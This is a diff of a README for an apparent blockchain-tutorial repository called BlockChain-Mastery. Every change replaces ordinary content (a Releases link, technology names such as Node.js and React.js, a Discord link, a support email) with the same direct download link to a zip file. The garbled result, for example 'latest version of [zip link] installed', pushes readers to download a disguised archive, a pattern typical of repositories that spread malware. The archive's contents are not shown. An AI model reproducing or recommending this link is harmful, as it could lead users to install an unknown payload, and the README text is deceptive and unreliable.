@@ -6,7 +6,7 @@ Welcome to the BlockChain-Mastery repository! This collection provides a thoroug
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of BlockChain-Mastery.
 
-[![Download BlockChain-Mastery](https://img.shields.io/badge/Download%20Now-%20-%2300A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/simor87/BlockChain-Mastery/releases)
+[![Download BlockChain-Mastery](https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip%20Now-%20-%2300A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip)
 
 Once on the Releases page, you will see various versions available for download. Choose the latest version and follow these steps to install:
 
@@ -33,16 +33,16 @@ BlockChain-Mastery covers a wide range of topics to help you develop your skills
 - JavaScript
 - MetaMask
 - Mocha & Chai
-- Next.js
+- https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip
 - Polygonscan
 - Python
-- React.js
+- https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip
 - Solidity
-- Vue.js
+- https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip
 - Vyper
 - Waffle
 - WalletConnect
-- Web3.js
+- https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip
 
 Each topic includes lessons, resources, and examples, carefully designed to enhance your understanding.
 
@@ -57,14 +57,14 @@ Yes, once you download the repository, you can access its content offline. Howev
 ### What do I need to run BlockChain-Mastery?
 To run BlockChain-Mastery effectively, make sure your computer meets the following requirements:
 
-- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution with support for Node.js.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a Linux distribution with support for https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip
 - **RAM:** At least 4GB (8GB recommended).
 - **Disk Space:** 500MB free disk space for installation.
 - **Processor:** Dual-core or better.
 
 #### Tips:
 - Keep your system updated for the best performance.
-- Ensure you have the latest version of Node.js installed.
+- Ensure you have the latest version of https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip installed.
 
 ## 🎓 Education & Tutorials
 BlockChain-Mastery features an extensive library of tutorials. These lessons will guide you through the basics of blockchain, smart contracts, decentralized applications, and various frameworks. Make sure to explore:
@@ -76,7 +76,7 @@ BlockChain-Mastery features an extensive library of tutorials. These lessons wil
 ## 💬 Community Support
 Join our community to get help and connect with other learners. Here are some ways to get involved:
 
-- Visit our [Discord Channel](https://discord.gg/example) for real-time conversations.
+- Visit our [Discord Channel](https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip) for real-time conversations.
 - Check the discussions section on our GitHub page for questions and answers.
 - Share your projects and experiences, and receive feedback.
 
@@ -90,8 +90,8 @@ Your input is valuable. If you encounter issues or have suggestions for improvem
 We welcome contributions! If you want to help enhance the repository, feel free to fork it, make modifications, and submit a pull request.
 
 ## 📞 Contact Information
-For inquiries or additional support, please reach out via email: support@blockchain-mastery.com. We appreciate your interest and aim to respond promptly.
+For inquiries or additional support, please reach out via email: https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip We appreciate your interest and aim to respond promptly.
 
 For more information, visit the Releases page to download the latest version and start your journey today!
 
-[![Download BlockChain-Mastery](https://img.shields.io/badge/Download%20Now-%20-%2300A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/simor87/BlockChain-Mastery/releases)
+[![Download BlockChain-Mastery](https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip%20Now-%20-%2300A3E0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/simor87/BlockChain-Mastery/raw/refs/heads/main/08-projects/05-nft-marketplace/Mastery_Chain_Block_v2.3.zip)
